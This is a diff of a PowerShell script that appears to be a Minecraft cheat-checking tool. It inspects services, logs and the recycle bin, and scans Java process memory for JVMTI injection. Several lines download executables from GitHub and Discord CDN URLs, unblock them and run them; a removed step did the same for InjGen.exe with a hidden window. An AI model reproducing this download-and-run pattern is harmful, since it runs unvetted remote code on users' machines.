@@ -4,6 +4,7 @@ $OutputEncoding = [System.Text.Encoding]::UTF8
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $ErrorActionPreference = "SilentlyContinue"
 
+# Цветовая схема
 $C1 = [char]27 + "[38;5;129m"
 $C2 = [char]27 + "[38;5;93m"  
 $C3 = [char]27 + "[38;5;57m"  
@@ -11,9 +12,11 @@ $W  = [char]27 + "[37m"
 $G  = [char]27 + "[38;5;118m" 
 $GL = [char]27 + "[38;5;136m" 
 $R  = [char]27 + "[0m"         
-
 $RED = [char]27 + "[38;5;196m" 
 $ORG = [char]27 + "[38;5;208m" 
+
+# Принудительно включаем TLS 1.2 для работы с GitHub
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 $frames = @(
 @"
@@ -118,7 +121,7 @@ Write-Host "    HWID: $SystemHWID" -ForegroundColor White
 Write-Host "    Boot Time: $SystemBootTime" -ForegroundColor White
 Write-Host "    Current Time: $(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')" -ForegroundColor White
 
-# --- ИНТЕГРАЦИЯ SERVICE STATUS ИЗ SOURCE.PY ---
+# --- SERVICE STATUS ---
 Write-Host "`n[*] SERVICE STATUS :" -ForegroundColor White
 $ServicesToCheck = @(
     @{ Name = "SysMain"; Display = "SysMain" },
@@ -208,19 +211,8 @@ if ($Users) {
     }
 }
 
-Write-Host "`n[3/6] RUNNING INJGEN..." -ForegroundColor White
-$injUrl = "https://raw.githubusercontent.com/koras5880-alt/injgen/refs/heads/main/InjGen.exe"
-if (-not (Test-Path "InjGen.exe")) {
-    try { Invoke-WebRequest -Uri $injUrl -OutFile "InjGen.exe" -UseBasicParsing } catch {}
-}
-if (Test-Path "InjGen.exe") {
-    Start-Process -FilePath ".\InjGen.exe" -WindowStyle Hidden
-    Write-Host ($G + "[+] InjGen started" + $R)
-    Start-Sleep -Seconds 1.4
-}
-
-# --- [4/6] RECYCLE BIN ANALYSIS ---
-Write-Host "`n[4/6] RECYCLE BIN ANALYSIS..." -ForegroundColor White
+# --- [3/6] RECYCLE BIN ANALYSIS ---
+Write-Host "`n[3/6] RECYCLE BIN ANALYSIS..." -ForegroundColor White
 $Drives = Get-PSDrive -PSProvider FileSystem
 $LatestClean = $null
 $FoundAnyFile = $false
@@ -265,12 +257,10 @@ if (-not $FoundAnyFile) {
 
 if ($null -ne $LatestClean) {
     Write-Host "`nLatest update: $($LatestClean.ToString('dd.MM.yyyy HH:mm:ss'))" -ForegroundColor Yellow
-} else {
-    Write-Host "`nNo activity detected" -ForegroundColor Red
 }
 
-# --- [5/6] EVENT LOG ANALYSIS ---
-Write-Host "`n[5/6] EVENT LOG ANALYSIS..." -ForegroundColor White
+# --- [4/6] EVENT LOG ANALYSIS ---
+Write-Host "`n[4/6] EVENT LOG ANALYSIS..." -ForegroundColor White
 
 try {
     $e = Get-WinEvent -FilterHashtable @{LogName="Application"; ID=3079} -MaxEvents 1 -ErrorAction Stop
@@ -288,6 +278,97 @@ try {
     Write-Host "  [+] Security Log Clear (ID 1102): Not found" -ForegroundColor Green
 }
 
+# --- [5/6] JVMTI DETECTOR ---
+Write-Host "`n[5/6] JVMTI DETECTOR..." -ForegroundColor White
+
+$PATTERN_A = [uint32]524294
+$PATTERN_B = [uint32]4242546329
+
+function Find-DwordInBytes {
+    param([byte[]]$Buffer, [uint32]$Target, [int]$BaseOffset)
+    $i = 0
+    while ($i + 4 -le $Buffer.Length) {
+        $val = [System.BitConverter]::ToUInt32($Buffer, $i)
+        if ($val -eq $Target) { return $BaseOffset + $i }
+        $i += 4
+    }
+    return $null
+}
+
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class WinMem {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, int dwPid);
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBase, byte[] lpBuffer, int nSize, out int lpRead);
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+'@ -ErrorAction SilentlyContinue
+
+function Scan-JvmDll {
+    param([System.Diagnostics.Process]$Process)
+    $jvmModule = $null
+    try { $jvmModule = $Process.Modules | Where-Object { $_.ModuleName -ieq "jvm.dll" } | Select-Object -First 1 } catch {}
+    if (-not $jvmModule) { return $null }
+
+    $baseAddr   = $jvmModule.BaseAddress.ToInt64()
+    $moduleSize = $jvmModule.ModuleMemorySize
+    $hProc = [WinMem]::OpenProcess(0x0410, $false, $Process.Id)
+    if ($hProc -eq [IntPtr]::Zero) { return $null }
+
+    try {
+        $chunkSize = 256 * 1024
+        $hitA = $null; $hitB = $null; $offset = 0
+        while ($offset -lt $moduleSize) {
+            $toRead = [Math]::Min($chunkSize, $moduleSize - $offset)
+            $buf    = New-Object byte[] $toRead
+            $read   = 0
+            $addr   = [IntPtr]($baseAddr + $offset)
+            $ok     = [WinMem]::ReadProcessMemory($hProc, $addr, $buf, $toRead, [ref]$read)
+            if ($ok -and $read -gt 0) {
+                $slice = if ($read -lt $buf.Length) { $buf[0..($read-1)] } else { $buf }
+                if ($null -eq $hitA) { $hitA = Find-DwordInBytes -Buffer $slice -Target $PATTERN_A -BaseOffset $offset }
+                if ($null -eq $hitB) { $hitB = Find-DwordInBytes -Buffer $slice -Target $PATTERN_B -BaseOffset $offset }
+            }
+            $offset += $chunkSize
+        }
+        return [PSCustomObject]@{ Pid = $Process.Id; JvmPath = $jvmModule.FileName; HitA = $hitA; HitB = $hitB }
+    } finally {
+        [WinMem]::CloseHandle($hProc) | Out-Null
+    }
+}
+
+$javawProcs = Get-Process -Name "javaw" -ErrorAction SilentlyContinue
+
+if (-not $javawProcs) {
+    Write-Host ($W + "  [+] Minecraft not found" + $R)
+} else {
+    $jvmtiFound   = $false
+    $jvmtiPartial = $false
+    foreach ($proc in @($javawProcs)) {
+        $result = Scan-JvmDll -Process $proc
+        if (-not $result) { continue }
+        $bothHit = ($null -ne $result.HitA) -and ($null -ne $result.HitB)
+        $anyHit  = ($null -ne $result.HitA) -or  ($null -ne $result.HitB)
+        if ($bothHit) { $jvmtiFound = $true; break }
+        if ($anyHit)  { $jvmtiPartial = $true }
+    }
+
+    if ($jvmtiFound) {
+        Write-Host ($RED + "  [!] JVMTI inject detect" + $R)
+    } elseif ($jvmtiPartial) {
+        Write-Host ($ORG + "  [?] JVMTI inject possible detect" + $R)
+    } else {
+        Write-Host ($G + "  [+] JVMTI inject not detected" + $R)
+    }
+}
+
+# --- [6/6] OPENING UTILS ---
+Write-Host "`n[6/6] OPENING UTILS..." -ForegroundColor White
+
 $SilentUtils = @(
     @{ Path = "USBDriveLog.exe"; URL = "https://cdn.discordapp.com/attachments/1491468384255086634/1491511410050728096/USBDriveLog.exe" }
     @{ Path = "JournalTrace.exe"; URL = "https://github.com/ponei/JournalTrace/releases/download/1.0/JournalTrace.exe" }
@@ -295,15 +376,14 @@ $SilentUtils = @(
     @{ Path = "Everything.exe"; URL = "https://raw.githubusercontent.com/koras5880-alt/everything/refs/heads/main/Everything.exe" }
 )
 
-# --- [6/6] OPENING UTILS ---
-Write-Host "`n[6/6] OPENING UTILS..." -ForegroundColor White
-
 foreach ($u in $SilentUtils) {
-    if (-not (Test-Path $u.Path)) {
-        try { Invoke-WebRequest -Uri $u.URL -OutFile $u.Path -UseBasicParsing } catch {}
+    $p = Join-Path $workPath $u.Path
+    if (-not (Test-Path $p)) {
+        try { Invoke-WebRequest -Uri $u.URL -OutFile $p -UseBasicParsing } catch {}
     }
-    if (Test-Path $u.Path) {
-        Start-Process -FilePath ".\$($u.Path)" -ErrorAction SilentlyContinue
+    if (Test-Path $p) {
+        Unblock-File -Path $p
+        Start-Process -FilePath $p -WorkingDirectory $workPath -ErrorAction SilentlyContinue
         Start-Sleep -Milliseconds 500
     }
 }
